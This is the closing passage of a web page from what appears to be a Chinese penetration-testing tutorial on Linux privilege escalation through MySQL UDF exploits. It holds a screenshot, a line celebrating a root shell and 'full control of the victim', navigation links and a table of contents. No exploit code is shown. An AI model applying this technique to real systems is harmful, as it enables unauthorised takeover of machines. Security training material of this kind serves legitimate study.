class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="393" height="63" class="img_ev3q"></p>
<p>就这样…我们得到了 root shell，现在可以完全控制受害者！</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Linux 提权/Linux 提权-LXD 容器"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Linux 提权-LXD 容器</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Linux 提权/Linux 提权-NFS 共享"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Linux 提权-NFS 共享</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1什么是用户定义函数-udf" class="table-of-contents__link toc-highlight"><strong><div>1、什么是用户定义函数 (UDF)？</div></strong></a></li><li><a href="#2枚举-udf-漏洞利用条件" class="table-of-contents__link toc-highlight"><strong><div>2、枚举 UDF 漏洞利用条件</div></strong></a></li><li><a href="#22工具枚举-udf-漏洞利用条件" class="table-of-contents__link toc-highlight"><strong><div>2.2、工具枚举 UDF 漏洞利用条件</div></strong></a></li><li><a href="#3定位下载和编译-udf-漏洞" class="table-of-contents__link toc-highlight"><strong><div>3、定位、下载和编译 UDF 漏洞</div></strong></a></li><li><a href="#4使用-udf-漏洞获取-root-shell" class="table-of-contents__link toc-highlight"><strong><div>4、使用 UDF 漏洞获取 Root Shell</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>